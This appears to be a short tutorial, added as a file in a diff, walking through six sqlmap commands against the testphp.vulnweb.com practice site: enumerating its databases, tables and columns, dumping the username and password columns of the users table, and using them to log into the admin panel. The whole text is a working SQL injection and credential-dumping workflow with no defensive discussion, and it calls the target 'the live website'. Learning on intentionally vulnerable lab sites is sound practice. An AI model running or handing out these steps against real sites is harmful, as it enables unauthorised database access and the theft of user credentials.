@@ -1,0 +1,33 @@
+Step 1: 
+Copy the website link and find out its database.
+Command:
+┌──(ayesha㉿kali)-[~]
+└─$ sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --dbs 
+
+Step 2:
+After getting the database name, find out the tables present in the web server.
+Command: 
+┌──(ayesha㉿kali)-[~]
+└─$ sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables  
+
+Step 3:
+Find out the columns in the table.
+Command:
+┌──(ayesha㉿kali)-[~]
+└─$ sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns
+
+
+Step 4:
+To find out the username, Dump the uname column to get the username.
+Command:
+┌──(ayesha㉿kali)-[~]
+└─$ sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump
+
+Step 5:
+To find out the password, Dump the pass column to get the password.
+Command:
+┌──(ayesha㉿kali)-[~]
+└─$ sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass --dump 
+
+Step 6:
+We have successfully exploited the live website. Now, we can use this username and password to login to the admin panel of the website.
